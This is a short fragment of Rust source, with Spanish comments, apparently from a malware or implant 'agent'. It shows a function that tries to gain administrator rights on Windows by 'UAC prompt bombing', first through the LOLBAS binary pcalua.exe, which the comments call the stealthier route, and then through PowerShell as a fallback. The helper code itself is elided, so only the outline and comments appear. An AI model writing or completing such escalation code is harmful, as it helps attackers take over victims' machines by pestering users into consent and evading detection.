...
fn elevate_agent() -> String {
    ...
    // TÉCNICA 1: Intentar pcalua.exe con UAC prompt bombing (LOLBAS - más sigiloso)
    if let Ok(result) = elevate_agent_via_vbs(exe_str) {
        return result;
    }
    
    debug_print!("DEBUG: pcalua.exe elevation failed, trying PowerShell with UAC bombing...");
    
    // TÉCNICA 2: PowerShell con UAC prompt bombing como fallback
